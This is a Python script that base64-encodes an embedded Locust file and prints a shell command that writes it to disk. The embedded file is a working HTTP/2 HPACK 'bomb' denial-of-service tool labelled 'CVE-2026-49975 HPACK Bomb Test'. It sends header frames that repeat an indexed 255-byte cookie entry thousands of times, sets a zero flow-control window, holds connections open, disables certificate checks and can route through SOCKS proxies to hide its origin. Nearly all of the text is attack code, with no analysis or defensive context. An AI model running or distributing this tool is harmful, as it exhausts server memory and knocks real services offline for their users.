#!/usr/bin/env python3
code = '''#!/usr/bin/env python3
from locust import User, task, constant, events
import socket, ssl, struct, time, logging, os

try:
    import socks
    HAS_SOCKS = True
except:
    HAS_SOCKS = False

logger = logging.getLogger(__name__)

REFERENCES = int(os.environ.get("LOCUST_REFERENCES", "2048"))
HOLD = int(os.environ.get("LOCUST_HOLD_SECONDS", "15"))
STREAMS = int(os.environ.get("LOCUST_STREAMS", "1"))
PROXY = os.environ.get("SOCKS5_PROXY", "").strip()

def parse_proxy(url):
    if not url:
        return None, None, None
    url = url.strip()
    if "://" not in url:
        if HAS_SOCKS:
            p = url.rsplit(":", 1)
            return socks.SOCKS5, p[0].strip(), int(p[1])
        return None, None, None
    if url.startswith("socks5://"):
        if not HAS_SOCKS:
            return None, None, None
        pt, rest = socks.SOCKS5, url[8:]
    elif url.startswith("socks4://"):
        if not HAS_SOCKS:
            return None, None, None
        pt, rest = socks.SOCKS4, url[9:]
    else:
        return None, None, None
    if "@" in rest:
        rest = rest.split("@")[-1]
    if ":" in rest:
        h, ps = rest.split(":", 1)
        return pt, h, int(ps.split("/")[0])
    return pt, rest, 1080

def conn(addr, timeout=None, pp=None):
    pt, ph, pp2 = pp or (None, None, None)
    if pt and HAS_SOCKS:
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        un = os.environ.get("SOCKS5_USER", "")
        pw = os.environ.get("SOCKS5_PASS", "")
        s.set_proxy(pt, ph, pp2, un, pw)
        if timeout:
            s.settimeout(timeout)
        s.connect(addr)
        return s
    return socket.create_connection(addr, timeout=timeout)

PP = parse_proxy(PROXY)
CP = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def bf(ft, fl, sid, pl):
    return struct.pack(">I", len(pl))[1:] + struct.pack("BB", ft, fl) + struct.pack(">I", sid & 0x7FFFFFFF) + pl

def bs(iws=0, mfs=16384):
    return bf(4, 0, 0, struct.pack(">HI", 4, iws) + struct.pack(">HI", 5, mfs))

def bhf(sid, iref=2048):
    v = b"a" * 255
    ip = bytes([0x40, 6]) + b"cookie" + bytes([255]) + v
    return bf(1, 5, sid, ip + bytes([0xBE]) * iref)

class H2Bomb(User):
    wait_time = constant(0)
    rs = REFERENCES
    sc = STREAMS
    hs = HOLD
    _ctx = None

    @classmethod
    def gc(cls):
        if cls._ctx is None:
            c = ssl.create_default_context()
            c.set_alpn_protocols(["h2"])
            c.check_hostname = False
            c.verify_mode = ssl.CERT_NONE
            cls._ctx = c
        return cls._ctx

    def ph(self):
        h = self.host or "https://127.0.0.1"
        if h.startswith("https://"):
            r, t, dp = h[8:], True, 443
        elif h.startswith("http://"):
            r, t, dp = h[7:], False, 80
        else:
            r, t, dp = h, True, 443
        if ":" in r:
            hn, ps = r.split(":", 1)
            return hn, int(ps.split("/")[0]), t
        return r.split("/")[0], dp, t

    @task
    def attack(self):
        hn, p, tls = self.ph()
        sk = None
        st = time.time()
        exc = None
        try:
            sk = conn((hn, p), timeout=10.0, pp=PP)
            if tls:
                sk = self.gc().wrap_socket(sk, server_hostname=hn)
            sk.sendall(CP)
            sk.sendall(bs(iws=0))
            for sid in range(1, 2 * self.sc, 2):
                sk.sendall(bhf(sid, self.rs))
            if self.hs > 0:
                et = time.time() + self.hs
                while time.time() < et:
                    try:
                        sk.settimeout(1.0)
                        d = sk.recv(4096)
                        if not d:
                            break
                    except socket.timeout:
                        continue
                    except:
                        break
        except Exception as e:
            exc = e
        finally:
            if sk:
                try:
                    sk.close()
                except:
                    pass
            tt = int((time.time() - st) * 1000)
            pn = "proxy" if PROXY else "direct"
            rn = "/ (refs=" + str(self.rs) + ", hold=" + str(self.hs) + "s, via=" + pn + ")"
            self.environment.events.request.fire("H2-BOMB", rn, tt, 0, exc, {})

@events.init.add_listener
def start(env, **kw):
    pd = PROXY if PROXY else "direct"
    logger.info("=" * 60)
    logger.info("CVE-2026-49975 HPACK Bomb Test")
    logger.info("Users: " + str(env.runner.target_user_count))
    logger.info("HPACK refs: " + str(REFERENCES))
    logger.info("Hold sec: " + str(HOLD))
    logger.info("Target: " + str(env.host))
    logger.info("Proxy: " + pd)
    logger.info("=" * 60)
'''

import base64
encoded = base64.b64encode(code.encode("utf-8")).decode("ascii")
print("echo '" + encoded + "' | base64 -d > locustfile.py")